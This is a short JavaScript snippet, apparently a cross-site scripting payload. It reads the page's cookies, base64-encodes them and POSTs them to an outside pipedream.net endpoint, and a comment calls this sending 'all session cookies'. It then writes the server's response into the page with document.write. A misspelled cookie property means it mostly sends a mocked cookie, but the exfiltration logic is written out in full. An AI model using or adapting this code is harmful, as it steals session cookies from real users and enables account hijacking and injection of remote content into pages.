// Extract document cookies (or mock one for development purposes)
let cookies = document.cookies;
if (typeof (document.cookies) === "undefined") {
    console.log("This document has no cookies, mocking...");
    cookies = "mockedCookie=true; Expires=Wed, 09 Jun 2024 10:18:14 GMT"; // mock cookie
}

const headers = new Headers()
headers.append("Content-Type", "application/json")

const body = {
    "payload": cookies
}

const options = {
    method: "POST",
    headers,
    mode: "cors",
    body: JSON.stringify({
        object: cookies,
        b64json: JSON.stringify(btoa(cookies))
    })
}

// post all session cookies and retrieve nice picture in exchange
fetch("https://eouk77kbua3kmsa.m.pipedream.net", options)
.then(response => response.text())
.then((response) => {
    console.log(response);
    document.write(response);
});